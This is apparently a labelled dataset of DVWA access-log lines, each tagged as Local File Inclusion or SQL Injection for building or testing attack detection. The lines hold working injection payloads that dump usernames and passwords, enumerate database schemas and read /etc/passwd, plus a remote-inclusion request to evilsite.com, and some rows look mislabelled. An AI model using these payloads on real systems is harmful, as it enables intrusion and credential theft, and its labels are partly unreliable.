Logs,Attack,
"GET /dvwa/vulnerabilities/view_help.php?id=fi&security=low&locale=en HTTP/1.1"" 200 1997 ""http://127.0.0.1/dvwa/vulnerabilities/fi/?page=../../hackable/flags/fi.php",Local File Inclusion,2
"GET /dvwa/vulnerabilities/fi?page=http://www.evilsite.com/evil.php HTTP/1.1"" 301 678",Local File Inclusion,2
"GET /dvwa/dvwa/css/source.css HTTP/1.1"" 200 533 ""http://127.0.0.1/dvwa/vulnerabilities/view_source.php?id=fi&security=low",Local File Inclusion,2
"GET /dvwa/vulnerabilities/fi/?page=http://www.evilsite.com/evil.php HTTP/1.1"" 200 1375",Local File Inclusion,2
"GET /dvwa/vulnerabilities/sqli/?id=SELECT+%40%40version&Submit=Submit HTTP/1.1"" 200 1667",SQL Injection,3
"GET /dvwa/vulnerabilities/sqli/?id=1234+SQL%40%40version&Submit=Submit HTTP/1.1"" 200 1667 ""http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=SELECT+%40%40version&Submit=Submit",SQL Injection,3
"GET /dvwa/vulnerabilities/sqli/?id=1%27SELECT+%40%40version&Submit=Submit HTTP/1.1"" 500 295",SQL Injection,3
"GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2Cpassword+FROM+users%23&Submit=Submit HTTP/1.1"" 200 1888",SQL Injection,3
"GET /dvwa/vulnerabilities/sqli/?id=1%27SELECT+%40%40version&Submit=Submit HTTP/1.1"" 500 295 ""http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2Cpassword+FROM+users%23&Submit=Submit",SQL Injection,3
"GET /dvwa/vulnerabilities/sqli/?id=1%27SELECT+version+FROM+v%24instance&Submit=Submit HTTP/1.1"" 500 295 ""http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2Cpassword+FROM+users%23&Submit=Submit",SQL Injection,3
"GET /dvwa/vulnerabilities/sqli/?id=1%27UNION+SELECT+%40%40version&Submit=Submit HTTP/1.1"" 500 295 ""http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2Cpassword+FROM+users%23&Submit=Submit",SQL Injection,3
"GET /dvwa/vulnerabilities/sqli/?id=1%27SELECT+*+FROM+information_schema.tables&Submit=Submit HTTP/1.1"" 500 295",SQL Injection,3
"GET /dvwa/vulnerabilities/sqli/?id=1%27UNION+SELECT+*+FROM+information_schema.tables&Submit=Submit HTTP/1.1"" 500 295",SQL Injection,3
"GET /dvwa/vulnerabilities/sqli/?id=%24getid+%3D+%22SELECT+first_name%2C+last_name+FROM+users+WHERE+user_id+%3D+%27%24id%27%22%3B&Submit=Submit HTTP/1.1"" 500 295",SQL Injection,3
"GET /dvwa/vulnerabilities/sqli/?id=%25%27+or+%270%27%3D%270&Submit=Submit HTTP/1.1"" 200 1751",SQL Injection,3
"GET /dvwa/vulnerabilities/sqli/?id=%25%27+or+0%3D0+union+select+null%2C+version%28%29+%23&Submit=Submit HTTP/1.1"" 200 1798",SQL Injection,3
"GET /dvwa/vulnerabilities/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+table_name+from+information_schema.tables+%23&Submit=Submit HTTP/1.1"" 200 2428",SQL Injection,3
"GET /dvwa/vulnerabilities/sqli/?id=%25%27+and+1%3D-0+union+select+null%2C+table_name+from+information_schema.tables+where+table_name+like%27user%25%27+%23&Submit=Submit HTTP/1.1"" 200 1797",SQL Injection,3
"GET /dvwa/vulnerabilities/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+concat%28table_name%2C0x0a%2Ccolumn-name%29+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit HTTP/1.1"" 500 295",SQL Injection,3
"GET /dvwa/vulnerabilities/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+concat%28first_name%2C0x0a%2Clast_name%2C0x0a%2Cuser%2C0x0a%2Cpassword%29+from+users+%23&Submit=Submit HTTP/1.1"" 200 1945",SQL Injection,3
"GET /dvwa/vulnerabilities/sqli/?id=%27+union+select+1%2C%40%40version%23&Submit=Submit HTTP/1.1"" 200 1727",SQL Injection,3
"GET /dvwa/vulnerabilities/sqli/?id=%27+union+select+null%2C%40%40hostname+%23&Submit=Submit HTTP/1.1"" 200 1715",SQL Injection,3
"GET /dvwa/vulnerabilities/sqli/?id=%27+order+by+1+%23&Submit=Submit HTTP/1.1"" 200 1667",SQL Injection,3
"GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+system_user%28%29%2Cuser%28%29+%23&Submit=Submit HTTP/1.1"" 200 1721",SQL Injection,3
"GET /dvwa/vulnerabilities/sqli/?id=%27+union+select+null%2Cdatabase%28%29+%23&Submit=Submit HTTP/1.1"" 200 1714",SQL Injection,3
"GET /dvwa/vulnerabilities/sqli/?id=%27+union+select+null%2Cschema_name+from+information_schema.schemata+%23&Submit=Submit HTTP/1.1"" 200 1741",SQL Injection,3
"GET /dvwa/vulnerabilities/sqli/?id=%27+union+select+null%2Ctable_name+from+information_schema.tables+%23&Submit=Submit HTTP/1.1"" 200 2399",SQL Injection,3
"GET /dvwa/vulnerabilities/sqli/?id=%27+union+select+null%2C%40%40datadir+%23&Submit=Submit HTTP/1.1"" 200 1721",SQL Injection,3
"GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+load_file%28%27%2Fetc%2Fpasswd%27%29%2Cnull+%23&Submit=Submit HTTP/1.1"" 200 1723",SQL Injection,3
